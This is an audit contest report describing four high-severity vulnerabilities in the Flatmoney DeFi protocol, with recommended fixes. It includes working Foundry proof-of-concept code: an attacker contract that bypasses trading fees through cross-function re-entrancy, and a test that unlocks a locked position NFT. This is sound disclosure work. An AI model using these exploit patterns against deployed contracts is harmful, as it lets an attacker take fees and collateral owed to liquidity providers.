# Flatmoney
## Contest Summary

Code under review: [2024-01-flatmoney](https://github.com/sherlock-audit/2023-12-flatmoney) (2400 nSLOC)

Contest Page:  [flatmoney-contest](https://audits.sherlock.xyz/contests/132)

Placement: #7/257

## Findings Summary
| Severity | Title |
|------------|---------|
| [High-1](#h-1-a-malicious-user-can-bypass-limit-order-trading-fees-via-cross-function-re-entrancy)   | A malicious user can bypass limit order trading fees via cross-function re-entrancy |
| [High-2](#h-2-during-liquidation-global-position-data-is-updated-with-the-wrong-price)  |During liquidation, global position data is updated with `position.lastPrice` rather than `currentPrice`|
| [High-3](#h-3-a-user-can-bypass-the-locking-of-tokens-in-announced-orders-by-unlocking-it-in-the-limitorder-contract)  |A user can bypass the locking of tokens in announced orders, by unlocking it in the LimitOrder contract.|
| [High-4](#h-4-incorrect-underflow-prevention-logic-when-updating-margindepositedtotal-which-can-lead-to-underflow-and-brick-the-system) |Incorrect underflow-prevention logic when updating `marginDepositedTotal` which can lead to underflow and brick the system.|

# Findings

## [H-1] A malicious user can bypass limit order trading fees via cross-function re-entrancy

Submitted by: **juan**, r0ck3tz, nobody2018, LTDingZhen

### Summary
A malicious user can bypass limit order trading fees via cross-function re-entrancy, since `_safeMint` makes an external call to the user before updating state.

### Vulnerability Description:

In the `LeverageModule` contract, the `_mint` function calls `_safeMint`, which makes an external call to the receiver of the NFT (the `to` address).

<details>
<summary>LeverageModule::_mint()</summary>

```javascript
function _mint(address _to) internal returns (uint256 _tokenId) {
        _tokenId = tokenIdNext;

        _safeMint(_to, tokenIdNext);

        tokenIdNext += 1;
}
```
</details>

Only after this external call, `vault.setPosition()` is called to create the new position in the vault's storage mapping. This means that an attacker can gain control of the execution while the state of  `_positions[_tokenId]` in FlatcoinVault is not up-to-date.

<details>

<summary>LeverageModule::executeOpen()</summary>

```javascript
_newTokenId = _mint(_account); // Here, an attack gains control of execution

vault.setPosition( // This updates _positions[_tokenId] in the FlatcoinVault, but after the external call
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
    _newTokenId
);
```

> Permalink: https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

</details>

This outdated state of `_positions[_tokenId]` can be exploited by an attacker once the external call has been made. They can re-enter `LimitOrder::announceLimitOrder()` and provide the tokenId that has just been minted.
In that function, the trading fee is calculated as follows:

```javascript
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);
```
However since the position has not been created yet (due to state being updated after an external call), this results in the `tradeFee` being 0 since `vault.getPosition(tokenId).additionalSize` returns the default value of a uint256 (0), and `tradeFee` = fee * size.

Hence, when the limit order is executed, the trading fee (`tradeFee`) charged to the user will be `0`.

### Impact:
A malicious user can bypass the trading fees for a limit order, via cross-function re-entrancy. These trading fees were supposed to be paid to the LPs by increasing `stableCollateralTotal`, but due to limit orders being able to bypass trading fees (albeit during the same transaction as opening the position), LPs are now less incentivised to provide their liquidity to the protocol.

### Proof of Concept:
Summary:
1. A user announces opening a leverage position, calling announceLeverageOpen() via a smart contract which implements `IERC721Receiver`.
2. Once the keeper executes the order, the contract is called, with the function `onERC721Received(address,address,uint256,bytes)`
3. The function calls `LimitOrder::announceLimitOrder()` to create the desired limit order to close the position. (stop loss, take profit levels)
4. The contract then returns `msg.sig` (the function signature of the executing function) to satify the `IERC721Receiver`'s requirement.

To run this proof of concept:
1. Add 2 files `AttackerContract.sol` and `ReentrancyPoC.t.sol` to `flatcoin-v1/test/unit` in the project's repo.
2. run `forge test --mt test_tradingFeeBypass -vv` in the terminal

<details><summary>Attacker Contract</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {Setup} from "../helpers/Setup.sol";
import {LimitOrder} from "src/LimitOrder.sol";

contract AttackerContract {

    LimitOrder limitOrderProxy;

    function setLimitOrderProxy(address limitOrderAddress) external {
        limitOrderProxy = LimitOrder(limitOrderAddress);
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {
        // Do the cross-function re-entrancy
        limitOrderProxy.announceLimitOrder(tokenId, 750e18, 1250e18);

        // Return the function signature (required by the standard)
        return msg.sig;
        // Note: Also could return `this.onERC721Received.selector` or `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`
    }
}
```
</details>

<details>
<summary>Proof of Concept (Foundry Test)</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {AttackerContract} from "./AttackerContract.sol";
import {Setup} from "../helpers/Setup.sol";

contract ReentrancyPoC is Setup, OrderHelpers {
    function test_tradingFeeBypass() public {
        
        // Set up and initialize the attacker's contract
        AttackerContract attackerContract = new AttackerContract();
        attackerContract.setLimitOrderProxy(address(limitOrderProxy));

        // Deal the exploiter contract with WETH + ETH
        deal(address(WETH), address(attackerContract), 100_000e18); // Loading account with `token`.
        deal(address(attackerContract), 100_000e18); // Loading account with native token.

        uint256 aliceBalanceBefore = WETH.balanceOf(alice);
        uint256 stableDeposit = 100e18;
        uint256 collateralPrice = 1000e8;

        // Alice provides liquidity
        vm.startPrank(alice);
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: stableDeposit,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });
        vm.stopPrank();

        // Contract opens position: 10 ETH collateral, 30 ETH additional size (4x leverage)
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: address(attackerContract),
            keeperAccount: keeper,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Get the limit order that has been created by the attacker's contract
        FlatcoinStructs.Order memory limitOrderCreated = limitOrderProxy.getLimitOrder(tokenId);

        // Get the order's data
        FlatcoinStructs.LimitClose memory orderData = abi.decode(limitOrderCreated.orderData, (FlatcoinStructs.LimitClose));
        
        ///////////////////////
        // POC Assertions    //
        ///////////////////////
        // Assert that the tradeFee for the limit order is 0
        assertEq(orderData.tradeFee, 0);

        // Assert that the price threshold is 750e18, showing that it is not zero, showing that the orderData is not just returning the default values.
        assertEq(orderData.priceLowerThreshold, 750e18);


        ///////////////////////
        // Other Assertions  //
        ///////////////////////
        // The following assertions are copied from another test in the test suite-

        // ERC721 token assertions:
        {
            (uint256 buyPrice, ) = oracleModProxy.getPrice();
            // Position 0:
            FlatcoinStructs.Position memory position0 = vaultProxy.getPosition(tokenId);
            assertEq(position0.lastPrice, buyPrice, "Entry price is not correct");
            assertEq(position0.marginDeposited, 10e18, "Margin deposited is not correct");
            assertEq(position0.additionalSize, 30e18, "Size is not correct");
            assertEq(tokenId, 0, "Token ID is not correct");
        }
        // PnL assertions:
        {
            FlatcoinStructs.PositionSummary memory positionSummary0 = leverageModProxy.getPositionSummary(tokenId);
            uint256 collateralPerShareBefore = stableModProxy.stableCollateralPerShare();

            // Check that before the WETH price change, there is no profit or loss change
            assertEq(positionSummary0.profitLoss, 0, "Pnl for user 0 is not correct");
            assertEq(
                positionSummary0.marginAfterSettlement,
                10e18,
                "Margin after settlement for user 0 is not correct"
            ); // full margin available
        }
    }  
}
```

</details>

<details>
<summary> Console Output </summary>

```powershell
Running 1 test for test/unit/ReentrancyPoC.t.sol:ReentrancyPoC
[PASS] test_tradingFeeBypass() (gas: 2006498)
Logs:
  tradeFee: 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.81ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>

### Recommended Mitigation:

To fix this specific issue, the following change is sufficient:
```diff
-_newTokenId = _mint(_account); 

vault.setPosition( 
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
-   _newTokenId
+   tokenIdNext
);
+_newTokenId = _mint(_account); 
``` 
However there are still more state changes that would occur after the `_mint` function (potentially yielding other cross-function re-entrancy if the other contracts were changed) so the optimum solution would be to mint the NFT after all state changes have been executed, so the safest solution would be to move `_mint` all the way to the end of `LeverageModule::executeOpen()`.

Otherwise, if changing this order of operations is undesirable for whatever reason, one can implement the following check within `LimitOrder::announceLimitOrder()` to ensure that the `positions[_tokenId]` is not uninitialized:

```diff
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);

+require(additionalSize > 0, "Additional Size of a position cannot be zero");

```
## [H-2] During liquidation, global position data is updated with the wrong price.

Submitted by: **juan**, xiaoming9090, 0xVolodya, OxLogos, santipu_, nobody2018

### Summary
During liquidation, global position data is updated with `position.lastPrice` rather than `currentPrice`. This will lead to incorrect PnL calculations later on, disrupting proper protocol functionality. 

### Vulnerability Description
In `LiquidationModule::liquidate()`, when `updateGlobalPositionData()` is called, the `price` parameter is set to `position.lastPrice`

```javascript
vault.updateGlobalPositionData({
            price: position.lastPrice,
            marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
            additionalSizeDelta: -int256(position.additionalSize)
        });
```
[Permalink](https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LiquidationModule.sol#L159-L163)

This value represents either the initial price at which the position was created, or the price of the latest adjustment to the position. 

This is an outdated price value and the local `currentPrice` variable which was obtained within the same transaction should be used instead, to update the global position data correctly.

### Impact
Incorrect PnL calculations in the future, since `FlatcoinVault::_globalPositions.lastPrice` will be incorrect. This can lead to unwarranted liquidations, and also not being able to liquidate underwater positions, potentially leading to protocol insolvency.

### Recommended Mitigation:
```diff
vault.updateGlobalPositionData({
-           price: position.lastPrice,
+           price: currentPrice,
            marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
            additionalSizeDelta: -int256(position.additionalSize)
        });
```
## [H-3] A user can bypass the locking of tokens in announced orders, by unlocking it in the LimitOrder contract.

### Summary
When a user calls `DelayedOrder::announceLeverageAdjust` or `announceLeverageClose`, the position NFT is locked to prevent it from being transferred while there is a pending order. However, the user can bypass this lock by creating a limit order and immediately cancelling it.

### Vulnerability details
When creating a limit order via `LimitOrder::announceLimitOrder`, the token is locked.

Then when cancelling the limit order via `LimitOrder::cancelLimitOrder`, the token is unlocked without checking if there is an announced close/adjust order, instead only checking if there is an existing limit order.

```javascript
function cancelLimitOrder(uint256 tokenId) external {
        address positionOwner = _checkPositionOwner(tokenId);
        _checkLimitCloseOrder(tokenId);
        delete _limitOrderClose[tokenId];

        // Unlock the ERC721 position NFT to allow for transfers.
@>      ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY))
        .unlock(tokenId);

        emit FlatcoinEvents.OrderCancelled({account: positionOwner, orderType: FlatcoinStructs.OrderType.LimitClose});
    }
```

Because of this, a user who has an announced and pending leverageAdjust/leverageClose order can simply create a limit order, cancel it in the same transaction in order to unlock their position's token.

### Impact
Tokens which are supposed to be locked while orders are pending can be unlocked. This means that they can transfer the token to someone else while a leverageClose/leverageAdjust order is pending. Then once the order is executed, they still receive the remaining settled margin.

### Proof of Concept

Summary:
1. User with a leverage position announces to either adjust or close their position. (This is supposed to lock their token until the order is executed)
2. User creates a limit close order, and then immediately cancels the order.
3. Token is now unlocked, even though the announced order still exists.

To run this PoC:
1. Add the following code to `flatcoin-v1/test/unit` in the audit repo
2. run `forge test --mt test_unlockToken`

<details>
<summary>Code proof (Foundry test)</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";

contract UnlockPoC is OrderHelpers {
    function test_unlockToken() public {
        uint256 stableDeposit = 100e18;
        uint256 collateralPrice = 1000e8;

        // Alice provides liquidity
        vm.startPrank(alice);
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: stableDeposit,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Alice opens position: 10 ETH collateral, 30 ETH additional size (4x leverage)
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });
        vm.stopPrank();

        // Now alice sends an adjustment announcement (so her token gets locked)
        announceAdjustLeverage(alice, tokenId, 5e18, 5e18, 0);

        // Assert that her token is now locked
        assertTrue(leverageModProxy.isLocked(tokenId));

        vm.startPrank(alice);
        // Create limit order
        limitOrderProxy.announceLimitOrder({
            tokenId: tokenId,
            priceLowerThreshold: 750e8,
            priceUpperThreshold: 1250e8
        });

        // Cancel limit order
        limitOrderProxy.cancelLimitOrder(tokenId);

        // Get details of alice's leverageAdjust order
        FlatcoinStructs.Order memory adjustOrderCreated = delayedOrderProxy.getAnnouncedOrder(alice);
        FlatcoinStructs.AnnouncedLeverageAdjust memory orderData = abi.decode(adjustOrderCreated.orderData, (FlatcoinStructs.AnnouncedLeverageAdjust));

        // Assert that her token is not locked anymore, but the leverage adjust announced order is still active
        assertFalse(leverageModProxy.isLocked(tokenId));
        assertEq(5e18, orderData.marginAdjustment);
    }
}
```
</details>

<details>
<summary> Console output </summary>

```powershell
Running 1 test for test/unit/UnlockPoC.t.sol:UnlockPoC
[PASS] test_unlockToken() (gas: 1861659)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.43ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
</details>

### Recommended Mitigation
In `DelayedOrder::cancelLimitOrder`, add a check to ensure that there a no announced order leverageAdjust or leverageClose for that tokenId, and if so, don't unlock the token.

```diff
function cancelLimitOrder(uint256 tokenId) external {
+       IDelayedOrder delayedOrder = IDelayedOrder(vault.moduleAddress(FlatcoinModuleKeys.__DELAYED_ORDER_KEY));
        address positionOwner = _checkPositionOwner(tokenId);
        _checkLimitCloseOrder(tokenId);
        delete _limitOrderClose[tokenId];


        // Unlock the ERC721 position NFT to allow for transfers.
+        FlatcoinStructs.OrderType orderType = delayedOrder.getAnnouncedOrder(msg.sender).orderType;
+        if (orderType != FlatcoinStructs.OrderType.LeverageClose && orderType != FlatcoinStructs.OrderType.LeverageAdjust) {
            ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).unlock(tokenId);
+        }

        emit FlatcoinEvents.OrderCancelled({account: positionOwner, orderType: FlatcoinStructs.OrderType.LimitClose});
    }
```
## [H-4] Incorrect underflow-prevention logic when updating `marginDepositedTotal` which can lead to underflow and brick the system.

### Summary
Logic to safeguard against underflow is implemented incorrectly, leading to `_globalPositions.marginDepositedTotal =  1e77`.
In other cases, it leads to `_globalPositions.marginDepositedTotal =  0` when it shouldn't be.

### Vulnerability Detail

The intention of the following logic in [`FlatcoinVault::settleFundingFees()`](https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/FlatcoinVault.sol#232-234) is to prevent underflow when casting `int256(_globalPositions.marginDepositedTotal) + _fundingFees)` to a uint256, attempting to avoid underflow in the odd case that `int256{(_globalPositions.marginDepositedTotal) + _fundingFees} < 0`. 

The mentioned logic:
```javascript
_globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
            ? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
            : 0;
```
However, the logic is incorrect in situations where `abs(_fundingFees) >= _globalPositions.marginDepositedTotal`, so the intention is not achieved.

Below are 2 cases that can arise due to this incorrect logic.

**Case 1** (`_fundingFees < 0 && abs(_fundingFees) >= _globalPositions.marginDepositedTotal`):

For example, if `_fundingFees == -5` and `_globalPositions.marginDepositedTotal == 2`, and `FlatcoinVault::settleFundingFees()` is called, while we would intend for `marginDepositedTotal` to be set to `0`, instead the first part of the ternary operator is triggered, it is set to `uint256(-2)` which underflows to become `2^256-3 (~1.2e77)`. 

This will now cause any order execution to fail, due to the inbuilt invariant checks within orders, which reverts if `collateralBalance < trackedCollateral` , where `trackedCollateral` is the same as `_globalPositions.marginDepositedTotal`

<details>
<summary>The Invariant Check that will cause orders to revert </summary>

```javascript
        uint256 collateralBalance = vault.collateral().balanceOf(address(vault));

        // this will never be less then collateralBalance (due to the underflow of `marginDepositedTotal`)
        uint256 trackedCollateral = vault.stableCollateralTotal() + vault.getGlobalPositions().marginDepositedTotal;

        if (collateralBalance < trackedCollateral) revert FlatcoinErrors.InvariantViolation("collateralNet");
```

> Permalink: https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/misc/InvariantChecks.sol#L94-L97
</details>

**Case 2** (`_fundingFees > 0 && abs(_fundingFees) >= _globalPositions.marginDepositedTotal`):

For example, when `_fundingFees == 15`, `marginDepositedTotal == 11` we would expect `marginDepositedTotal` to be set to `26` but instead, the second part of the ternary operator is triggered, setting `marginDepositedTotal` to zero which is not intended.

This case is less severe since there is no overflow/underflow (so no DoS) but `marginDepositedTotal` is incorrectly set to 0 when it should be incremented to 26, disrupting the protocol's functionality.

### Impact:

The attempted safeguard against underflow does not have sound logic, leading to integer underflow of `marginDepositedTotal`. The incorrect logic can lead to a permanent DoS given certain conditions (`_fundingFees < 0`), and in other conditions leads to incorrect accounting (`_fundingFees > 0`).


### Recommended Mitigation:

Fix the logic by implementing the updating of `_globalPositions.marginDepositedTotal` in a way that is more similar to the updating of  `stableCollateralTotal` in `FlatcoinVault::_updateStableCollateralTotal()`.

```diff
-_globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
-            ? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
-            : 0;

+int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _fundingFees
+
+_globalPositions.marginDepositedTotal = (newMarginDepositedTotal > 0) 
+                                        ? newMarginDepositedTotal 
+                                        : 0;
```
